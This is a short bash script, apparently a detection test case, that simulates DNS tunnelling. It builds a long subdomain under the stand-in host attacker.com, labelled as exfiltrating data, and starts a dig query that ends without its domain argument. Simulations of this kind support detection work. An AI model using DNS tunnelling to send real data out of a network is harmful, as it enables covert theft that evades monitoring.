#!/bin/bash
echo "[*] UC11: Simulating DNS Tunneling..."
# Querying a very long random subdomain
LONG_DOMAIN="very-long-encrypted-string-exfiltrating-data-1769117146.attacker.com"
dig @8.8.8.8 
